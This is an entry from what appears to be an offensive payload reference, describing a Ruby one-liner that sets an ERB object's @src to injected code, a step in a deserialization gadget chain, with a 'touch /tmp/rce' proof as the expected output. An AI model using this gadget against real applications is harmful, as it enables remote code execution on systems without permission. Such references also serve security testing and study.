---
data: 'erb.instance_variable_set :@src, code'
tags:
  - payload
  - erb
  - ruby
type: command
output: '"`touch /tmp/rce`"'
executor: ruby
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:49.239Z'
id: 78034143-cb62-44bb-b428-fc0565fc85df
verified: false
validated: true
submitted: true
---
# set-erb-src

## Command

```ruby
erb.instance_variable_set :@src, code
```

## Description

Inject malicious code into ERB @src.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| @src | code string | Yes |

## Examples

### Basic Usage

```ruby
erb.instance_variable_set :@src, code
```

## Expected Output

"`touch /tmp/rce`"

## Related

- [[commands/allocate-erb-object]]
